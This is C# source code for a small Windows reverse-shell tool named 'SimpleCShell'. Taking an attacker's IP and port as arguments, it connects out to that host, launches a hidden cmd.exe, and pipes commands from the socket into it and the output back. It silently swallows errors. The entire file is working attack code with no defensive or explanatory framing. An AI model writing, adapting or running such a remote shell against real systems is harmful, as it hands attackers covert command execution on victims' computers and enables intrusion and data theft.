using System;
using System.Linq;
using System.Collections.Generic;
using System.Text;
using System.Diagnostics;
using System.Threading;
using System.Threading.Tasks;
using System.Net.Sockets;
using System.IO;

namespace SimpleCShell
{
	class Program
	{
		public static StringBuilder cmd = new StringBuilder();
		private static StreamWriter sw;
		
		static void Main(string[] args)
        {
	        Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.DarkGray;
            Console.WriteLine("SimpleCShell");
            Console.ForegroundColor = ConsoleColor.Gray;
            Console.WriteLine("Usage[+] : cshell.exe <IP> <Port>");
            Console.WriteLine();

            try
            {
				using (TcpClient connect = new TcpClient(args[0].ToString(), Convert.ToInt32(args[1])))
				{
					Thread.Sleep(1100);
					using (Stream stget = connect.GetStream())
					{
						using (StreamReader stread = new StreamReader(stget))
						{
							sw = new StreamWriter(stget);
							
							Process proc = new Process();
							Thread.Sleep(3300);
							proc.StartInfo.FileName = "cmd.exe";
							proc.StartInfo.CreateNoWindow = true;
							proc.StartInfo.UseShellExecute = false;
							proc.OutputDataReceived += _OutputDataReceived;
							proc.StartInfo.RedirectStandardOutput = true;
							proc.StartInfo.RedirectStandardInput = true;
							proc.StartInfo.RedirectStandardError = true;
							proc.Start();
							proc.BeginOutputReadLine();
							
							while(true)
							{
								Thread.Sleep(3000);
								cmd.Append(stread.ReadLine());
								proc.StandardInput.WriteLine(cmd);
								cmd.Remove(0, cmd.Length);
								
							}			
						}
					}
				}				
			}
			
			catch (Exception) {  }			
	}
	
		private static void _OutputDataReceived(object sender, DataReceivedEventArgs echo)
		{
			StringBuilder cmdOutput = new StringBuilder();
			
			if (!String.IsNullOrEmpty(echo.Data))
				{
					try
					{
						cmdOutput.Append(echo.Data);
						sw.WriteLine(cmdOutput);
						sw.Flush();
					}
					catch (Exception err) { }
				}
		}
	}
		
}